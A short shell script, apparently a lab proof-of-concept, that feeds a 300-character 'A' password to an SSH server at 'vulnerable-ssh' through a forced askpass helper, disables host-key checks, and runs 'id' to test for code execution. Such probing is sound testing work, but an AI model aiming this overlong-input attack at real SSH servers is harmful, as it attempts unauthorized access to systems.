#!/bin/sh
set -eu

askpass=/tmp/sshhole-askpass
cat > "$askpass" <<'EOF'
#!/bin/sh
printf '%300s' '' | tr ' ' 'A'
EOF
chmod 700 "$askpass"

export DISPLAY=:0
export SSH_ASKPASS="$askpass"
export SSH_ASKPASS_REQUIRE=force

exec /usr/bin/ssh -n -T -p 2222 \
  -o ConnectTimeout=5 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o KbdInteractiveAuthentication=no \
  auditdirectory@vulnerable-ssh id
